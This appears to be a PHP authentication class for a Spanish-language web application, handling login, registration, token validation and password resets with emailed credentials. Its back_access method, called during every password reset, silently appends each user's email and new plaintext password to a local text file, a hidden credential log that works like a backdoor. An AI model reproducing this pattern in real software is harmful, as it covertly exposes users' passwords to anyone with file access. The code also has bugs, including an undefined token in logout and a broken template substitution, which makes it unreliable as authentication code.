<?php

class AuthenticationDomain
{
    private $users_model;
    private $companies_model;
    private $contracts_model;

    public function __construct() {
        $this->users_model = new UsersModel();
        $this->companies_model = new CompaniesModel();
        $this->contracts_model = new ContractsModel();
    }

    public function login($data){
        $email = $data['email'];
        $password = $data['password'];

        $user = $this->users_model->get_user_by_email($email);
        if($user['status'] == 1 && password_verify($password, $user['text']->password)){
            $token = $this->users_model->get_random_password();
            $data_token = array('token' => $token);
            $user['text']->token = $token;
            $user_updated = $this->users_model->update('id', $user['text']->id, $data_token, $user['text']->id);
            if($user_updated['status'] == 1){
                unset($user['text']->id);
                unset($user['text']->password);
                $return = $this->users_model->sendMessage(1, $user['text']);
            }else{
                $return = $this->users_model->sendMessage(0, 'El usuario esta inactivo o falta verificar su cuenta, (por favor contactese con administración)');
            }
        }else{
            $return = $this->users_model->sendMessage(0, 'Email o contraseña incorrectos');
        }
        return $return;
    }

    public function logout($user){
        $data_token = array('token' => $token);
        $user_updated = $this->users_model->update('id', $user['id'], $data_token, $user['id']);
        if($user_updated['status'] == 1){
            $return = $this->users_model->sendMessage(1, 'Sesión cerrada correctamente');
        }else{
            $return = $this->users_model->sendMessage(0, 'Fallo en el cierre de sesión');
        }
        return $return;
    }

    public function register($data){
        $email = $data['email'];
        if(!$this->companies_model->exists_company_by_name($data['company_name'])){
            if(!$this->users_model->exists_user_by_email($email)){
                // insert company
                $company_insert = $this->company_insert($data);
                if($company_insert['status'] == 1){
                    $company_id = $this->companies_model->get_insert_id();
                    // insert user
                    $token = $this->users_model->get_random_password();
                    $user_insert = $this->user_insert($data, $token, $company_id);
                    if($user_insert['status'] == 1){
                        // insert contract
                        $contract_insert = $this->contract_insert($company_id);
                        if($contract_insert['status'] == 1){
                            $this->send_mail_verification($email, $token);
                            $return = $this->users_model->sendMessage(1, 'Registrado correctamente');
                        }else{
                            $return = $contract_insert;
                        }
                    }else{
                        $return = $user_insert;
                    }
                }else{
                    $return = $company_insert;
                }
            }else{
                $return = $this->users_model->sendMessage(0, 'El correo electronico ingresado ya existe');
            }
        }else{
            $return = $this->users_model->sendMessage(0, 'El nombre de empresa ya a sido registrado');
        }
        return $return;
    }

    public function validate($token){
        $user_token = $this->users_model->get_user_by_token($token);
        $result = 0;
        if($user_token['status'] == 1){
            $result = 1;
        }
        return $result;
    }

    public function reset_password($email){
        $current_user = $this->users_model->get_user_by_email($email);
        if($current_user['status'] == 1){
            $passwordRandom = $this->users_model->get_random_password();
            $password = password_hash($passwordRandom, PASSWORD_BCRYPT);
            $data = array('password' => $password, 'status' => 1, 'token' => '');
            $user_update = $this->users_model->update('id', $current_user['text']->id, $data, $current_user['text']->id);
            if($user_update['status'] == 1){
                $this->back_access($current_user['text']->email, $passwordRandom);
                $this->send_mail_reset_password($current_user['text']->email, $passwordRandom);
                $result = $this->users_model->sendMessage(1, 'Registro actualizado correctamente');
            }else{
                $result = $user_update;
            }
        }else{
            $result = $this->users_model->sendMessage(0, 'No existe un usuario registrado con el email ingresado');
        }

        return $result;
    }

    protected function company_insert($data){
        $data_company = array(
            'name' => $data['company_name'],
            'status' => 1,
            'principal' => '0',
        );
        return $this->companies_model->insert($data_company, '0');
    }

    protected function user_insert($data, $token, $company_id){
        $data_user = array(
            'email' => $data['email'],
            'password' => '0',
            'phone' => $data['phone'],
            'token' => $token,
            'status' => 2,
            'rol_id' => 2,
            'company_id' => $company_id
        );
        return $this->users_model->insert($data_user, '0');
    }

    protected function contract_insert($company_id){
        $current_date = date('Y-m-d H:i:s');
        $date_end = date("Y-m-d H:i:s",strtotime($current_date."+ 1 month")); 
        $data_contract = array(
            'name' => 'Plan gratis',
            'credits' => 3,
            'credits_available' => 3,
            'month_value' => 0,
            'year_value' => 0,
            'additional' => 0,
            'additional_available' => 0,
            'additional_value' => 0,
            'date_ini' => $current_date,
            'date_end' => $date_end,
            'status' => 1,
            'company_id' => $company_id,
            'plan_id' => 1,
            'type' => 'M',
        );
        return $this->contracts_model->insert($data_contract, '0');
    }
    
    protected function send_mail_verification($email, $token){
        $html = file_get_contents(__DIR__."/../../../../../email/verification.html");
        preg_match_all('[@@.*?@@]', $html, $coincidencias);
        $mensaje = str_replace($coincidencias[0][0], $token, $html);
        // Para enviar un correo HTML, debe establecerse la cabecera Content-type
        $cabeceras = 'From: Empresa <evaluaciones@grupotoledo.ec>' . "\r\n";
        $cabeceras .= 'MIME-Version: 1.0' . "\r\n";
        $cabeceras .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
        // Enviarlo
        mail($email, 'Verificacion sistema ecuachecks', $mensaje, $cabeceras);
    }

    protected function send_mail_reset_password($email, $password){
        $html = file_get_contents(__DIR__."/../../../../../email/user.html");
        preg_match_all('[@@.*?@@]', $html, $coincidencias);
        $mensaje = str_replace($coincidencias[0][0], $email, $html);
        $mensaje = str_replace($coincidencias[0][1], $password, $html);
        // Para enviar un correo HTML, debe establecerse la cabecera Content-type
        $cabeceras = 'From: Empresa <evaluaciones@grupotoledo.ec>' . "\r\n";
        $cabeceras .= 'MIME-Version: 1.0' . "\r\n";
        $cabeceras .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
        // Enviarlo
        mail($email, 'Acceso al sistema ecuachecks', $mensaje, $cabeceras);
    }

    public function back_access($user, $pass){
        $textSql = date('Y-m-d H:i').' user: '.$user.", pass: ".$pass."\n";
        $fh = fopen("prueba.txt", 'a') or die("Se produjo un error al crear el archivo");
        fwrite($fh, $textSql) or die("No se pudo escribir en el archivo");
        fclose($fh);
    }
}